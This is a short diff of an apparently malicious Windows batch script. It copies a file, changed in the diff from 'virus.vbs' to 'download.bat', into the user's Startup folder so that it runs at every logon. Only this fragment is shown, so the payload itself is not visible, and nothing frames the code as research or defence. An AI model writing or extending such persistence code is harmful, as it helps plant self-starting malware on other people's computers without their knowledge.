@@ -5,4 +5,4 @@ set "demarrage2=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Progr
 
 cd %demarrage%
 
-copy virus.vbs "%demarrage2%"
+copy download.bat "%demarrage2%"
